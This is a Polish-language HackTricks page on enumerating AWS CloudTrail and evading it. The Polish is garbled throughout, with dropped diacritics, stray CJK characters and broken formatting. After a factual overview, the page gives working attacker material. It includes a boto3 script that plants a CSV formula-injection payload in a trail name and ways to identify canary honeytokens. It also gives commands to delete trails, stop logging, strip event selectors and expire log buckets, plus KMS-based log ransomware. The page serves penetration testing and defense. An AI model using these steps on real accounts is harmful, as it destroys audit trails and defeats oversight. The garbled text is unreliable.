# AWS - CloudTrail Enum

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytori贸w GitHub**.

</details>

## **CloudTrail**

AWS CloudTrail **rejestruje i monitoruje aktywno w Twoim rodowisku AWS**. Rejestruje szczeg贸owe **dzienniki zdarze**, w tym kto co, kiedy i skd, dla wszystkich interakcji z zasobami AWS. Zapewnia to lad audytowy zmian i dziaa, pomagajc w analizie bezpieczestwa, audytach zgodnoci i ledzeniu zmian zasob贸w. CloudTrail jest niezbdny do zrozumienia zachowa u偶ytkownik贸w i zasob贸w, poprawy postaw bezpieczestwa i zapewnienia zgodnoci z przepisami.

Ka偶de zdarzenie rejestrowane zawiera:

* Nazw wywoanej API: `eventName`
* Wywoan usug: `eventSource`
* Czas: `eventTime`
* Adres IP: `SourceIPAddress`
* Metod agenta: `userAgent`. Przykady:
* Signing.amazonaws.com - Z konsoli zarzdzania AWS
* console.amazonaws.com - U偶ytkownik g贸wny konta
* lambda.amazonaws.com - AWS Lambda
* Parametry 偶dania: `requestParameters`
* Elementy odpowiedzi: `responseElements`

Zdarzenia s zapisywane w nowym pliku dziennika **okoo co 5 minut w pliku JSON**, s przechowywane przez CloudTrail, a nastpnie pliki dziennika s **dostarczane do S3 okoo 15 minut po**.\
Dzienniki CloudTrail mog by **agregowane midzy kontami i regionami**.\
CloudTrail umo偶liwia u偶ycie **integralnoci pliku dziennika w celu weryfikacji, czy pliki dziennika pozostay niezmienione** od momentu dostarczenia ich przez CloudTrail. Tworzy skr贸t SHA-256 dziennik贸w wewntrz pliku skr贸tu. Skr贸t sha-256 nowych dziennik贸w jest tworzony co godzin.\
Podczas tworzenia cie偶ki selektory zdarze umo偶liwiaj wskazanie cie偶ki do rejestrowania: zdarzenia zarzdzania, danych lub wniosk贸w.

Dzienniki s zapisywane w kubeku S3. Domylnie u偶ywane jest szyfrowanie po stronie serwera (SSE-S3), wic AWS odszyfruje zawarto dla os贸b majcych do niej dostp, ale dla dodatkowego zabezpieczenia mo偶na u偶y SSE z KMS i wasnych kluczy.

Dzienniki s przechowywane w **kubeku S3 o nastpujcym formacie nazwy**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Przy czym BucketName to: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Przykad: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

W ka偶dym folderze ka偶dy dziennik bdzie mia **nazw wedug tego formatu**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Konwencja nazewnictwa plik贸w dziennika

![](<../../../../.gitbook/assets/image (29).png>)

Ponadto, **pliki skr贸tu (do sprawdzania integralnoci plik贸w)** bd znajdowa si w **tym samym kubeku**:

![](<../../../../.gitbook/assets/image (22).png>)

### Agregowanie dziennik贸w z wielu kont

* Utw贸rz cie偶k w koncie AWS, do kt贸rego chcesz dostarczy pliki dziennika
* Zastosuj uprawnienia do docelowego kubeka S3, umo偶liwiajce dostp midzykontowy dla CloudTrail i zezw贸l na dostp dla ka偶dego konta AWS, kt贸re potrzebuje dostpu
* Utw贸rz now cie偶k w innych kontach AWS i wybierz utworzony kubeek w kroku 1

Jednak nawet jeli mo偶esz zapisa wszystkie dzienniki w tym samym kubeku S3, nie mo偶esz agregowa dziennik贸w CloudTrail z wielu kont do dziennik贸w CloudWatch Logs nale偶cych do jednego konta AWS.

{% hint style="danger" %}
Pamitaj, 偶e konto mo偶e mie **r贸偶ne cie偶ki** z CloudTrail **wczone**, przechowujce te same (lub r贸偶ne) dzienniki w r贸偶nych kubekach.
{% endhint %}

### Cloudtrail ze wszystkich kont org do 1

Podczas tworzenia CloudTrail mo偶na wskaza, 偶eby aktywowa cloudtrail dla wszystkich kont w organizacji i otrzyma dzienniki do jednego kubeka:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

W ten spos贸b mo偶na atwo skonfigurowa CloudTrail we wszystkich regionach wszystkich kont i skoncentrowa dzienniki w 1 koncie (kt贸re nale偶y chroni).

### Sprawdzanie plik贸w dziennika

Mo偶esz sprawdzi, czy dzienniki nie zostay zmienione, uruchamiajc

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logi do CloudWatch

**CloudTrail mo偶e automatycznie wysya logi do CloudWatch, dziki czemu mo偶na ustawi alerty, kt贸re ostrzegaj, gdy wykonywane s podejrzane dziaania.**\
Nale偶y pamita, 偶e w celu umo偶liwienia CloudTrail wysyania log贸w do CloudWatch, musi zosta utworzona **rola**, kt贸ra umo偶liwia t akcj. Jeli to mo偶liwe, zaleca si u偶ycie domylnej roli AWS do wykonania tych dziaa. Rola ta umo偶liwi CloudTrail:

* CreateLogStream: Pozwala na tworzenie strumieni dziennik贸w CloudWatch Logs
* PutLogEvents: Dostarcza logi CloudTrail do strumienia dziennik贸w CloudWatch Logs

### Historia zdarze

Historia zdarze CloudTrail pozwala na sprawdzenie w tabeli zapisanych log贸w:

![](<../../../../.gitbook/assets/image (24).png>)

### Insights

**CloudTrail Insights** automatycznie **analizuje** zdarzenia zarzdzania zapisem z szlak贸w CloudTrail i **ostrzega** o **nietypowej aktywnoci**. Na przykad, jeli wystpi wzrost zdarze `TerminateInstance`, kt贸ry r贸偶ni si od ustalonych bazelin, zostanie to uznane za zdarzenie Insight. Te zdarzenia uatwiaj **odnajdywanie i reagowanie na nietypow aktywno API**.

Insights s przechowywane w tym samym kubeku co logi CloudTrail w: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Bezpieczestwo

| Integralno plik贸w dziennika CloudTrail | <ul><li>Sprawdza, czy logi zostay zmodyfikowane lub usunite</li><li><p>U偶ywa plik贸w skr贸tu (tworzy skr贸t dla ka偶dego pliku)</p><ul><li>Skr贸ty SHA-256</li><li>SHA-256 z RSA do podpisu cyfrowego</li><li>Klucz prywatny nale偶y do Amazon</li></ul></li><li>Tworzenie pliku skr贸tu trwa 1 godzin (wykonywane co godzin)</li></ul> |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Wstrzyknicie CSV**

Mo偶liwe jest wykonanie wstrzyknicia CVS w CloudTrail, kt贸re wykona dowolny kod, jeli dzienniki s eksportowane w formacie CSV i otwarte w programie Excel.\
Poni偶szy kod wygeneruje wpis dziennika z nieprawidow nazw Trail zawierajc adunek:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Aby uzyska wicej informacji na temat atak贸w CSV Injections, sprawd藕 stron:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Aby uzyska wicej informacji na temat tej konkretnej techniki, sprawd藕 [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Ominicie wykrywania**

### Ominicie **HoneyTokens**

HoneyTokens s tworzone w celu **wykrywania wycieku poufnych informacji**. W przypadku AWS s to **klucze AWS, kt贸rych u偶ycie jest monitorowane**, jeli co wywoa dziaanie z tym kluczem, to kto musia go ukra.

Jednak偶e, monitorowanie to odbywa si za porednictwem **CloudTrail**, a istniej niekt贸re **usugi AWS, kt贸re nie wysyaj log贸w do CloudTrail** (znajd藕 [list tutaj](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Niekt贸re z tych usug bd **odpowiada** bdem zawierajcym **ARN roli klucza**, jeli nieuprawniona osoba (klucz honeytoken) spr贸buje uzyska do niego dostp.

W ten spos贸b **atakujcy mo偶e uzyska ARN klucza bez wywoywania 偶adnego logu**. W ARN atakujcy mo偶e zobaczy **ID i nazw konta AWS**, atwo jest pozna ID i nazwy kont HoneyToken, wic w ten spos贸b atakujcy mo偶e zidentyfikowa, czy token jest HoneyTokenem.

![](<../../../../.gitbook/assets/image (65).png>)

#### **Wykrywanie HoneyTokens**

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) wykrywa, czy klucz nale偶y do [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Jeli w nazwie roli lub ID konta pojawi si **`canarytokens.org`**, lub w komunikacie bdu pojawi si **`534261010715`**.
* Testujc je bardziej niedawno, u偶ywaj konta **`717712589309`** i wci偶 maj cig **`canarytokens.com`** w nazwie.
* Jeli w nazwie roli w komunikacie bdu pojawi si **`SpaceCrab`**
* **SpaceSiren** u偶ywa **uuid** do generowania nazw u偶ytkownik贸w: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Jeli **nazwa wyglda jak losowo generowana**, istnieje du偶e prawdopodobiestwo, 偶e jest to HoneyToken.

{% hint style="danger" %}
Nale偶y zauwa偶y, 偶e wszystkie publiczne interfejsy API, kt贸re nie tworz log贸w CloudTrail, zostay naprawione, wic by mo偶e bdziesz musia znale藕 swoje wasne...

Lub mo偶esz uzyska **ID konta** zaszyfrowane wewntrz **klucza dostpu**, jak [**wyjaniono tutaj**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) i sprawdzi ID konta na licie swoich kont Honeytokens AWS:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print ("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
{% endhint %}

Aby uzyska wicej informacji, sprawd藕 [**oryginalne badania**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).

### Dostp do infrastruktury trzeciej strony

Niekt贸re usugi AWS bd **tworzy pewn infrastruktur**, tak jak **bazy danych** lub klastry **Kubernetes** (EKS). U偶ytkownik **bezporednio komunikujcy si z tymi usugami** (takimi jak interfejs API Kubernetes) **nie bdzie korzysta z interfejsu API AWS**, wic CloudTrail nie bdzie w stanie zobaczy tej komunikacji.

Dlatego u偶ytkownik majcy dostp do EKS, kt贸ry odkry adres URL interfejsu API EKS, mo偶e lokalnie wygenerowa token i **bez wykrycia przez CloudTrail komunikowa si bezporednio z usug API**.

Wicej informacji w:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modyfikowanie konfiguracji CloudTrail

#### Usuwanie cie偶ek
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Zatrzymaj cie偶ki

```bash
aws cloudtrail stop-logging --name <trail_name>
```

Zatrzymuje rejestrowanie zdarze dla okrelonej cie偶ki.
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Wyczanie logowania wieloregionowego

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Wyczanie logowania za pomoc selektor贸w zdarze

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

W pierwszym przykadzie podano pojedynczy selektor zdarze jako tablic JSON z jednym obiektem. `"ReadWriteType": "ReadOnly"` wskazuje, 偶e **selektor zdarze powinien rejestrowa tylko zdarzenia tylko do odczytu** (wic CloudTrail insights **nie bd sprawdza zdarze zapisu** na przykad).

Mo偶esz dostosowa selektor zdarze do swoich konkretnych wymaga.

#### Usuwanie dziennik贸w za pomoc polityki cyklu 偶ycia S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modyfikowanie konfiguracji kubeka

* Usu kubeek S3
* Zmie polityk kubeka, aby odrzuci wszelkie zapisy z usugi CloudTrail
* Dodaj polityk cyklu 偶ycia do kubeka S3 w celu usuwania obiekt贸w
* Wycz klucz KMS u偶ywany do szyfrowania dziennik贸w CloudTrail

### Ransomware CloudTrail

#### Ransomware S3

Mo偶esz **wygenerowa klucz asymetryczny** i sprawi, 偶e **CloudTrail zaszyfruje dane** tym kluczem, a nastpnie **usun klucz prywatny**, aby zawarto CloudTrail nie moga zosta odzyskana.\
To jest w zasadzie **ransomware S3-KMS** wyjaniony w:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

To jest najprostszy spos贸b na przeprowadzenie poprzedniego ataku z r贸偶nymi wymaganiami dotyczcymi uprawnie:

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Odnoniki**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **na GitHubie.**

</details>
